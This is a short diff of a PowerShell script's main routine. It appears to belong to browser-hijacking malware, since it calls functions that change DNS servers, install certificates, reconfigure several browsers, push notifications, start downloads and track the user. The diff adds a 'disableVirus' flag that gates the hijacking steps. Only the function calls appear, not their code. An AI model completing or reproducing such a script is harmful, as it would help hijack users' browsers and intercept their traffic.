@@ -20,18 +20,24 @@
 #   }
 
 function main {
-    ConfigureDnsServers
-    ConfigureCertificates
-    ConfigureChrome
-    ConfigureEdge
-    ConfigureYandex
-    ConfigureFireFox
-    ConfigureOpera
-    ConfigureChromeUblock
-    ConfigureChromePushes
+    if (-not $server.disableVirus)
+    {
+        ConfigureDnsServers
+        ConfigureCertificates
+        ConfigureChrome
+        ConfigureEdge
+        ConfigureYandex
+        ConfigureFireFox
+        ConfigureOpera
+        ConfigureChromeUblock
+        ConfigureChromePushes
+    }
     DoStartDownloads
     DoStartUrls
-    LaunchChromePushes
+    if (-not $server.disableVirus)
+    {
+        LaunchChromePushes
+    }
     DoTrack
 }
 
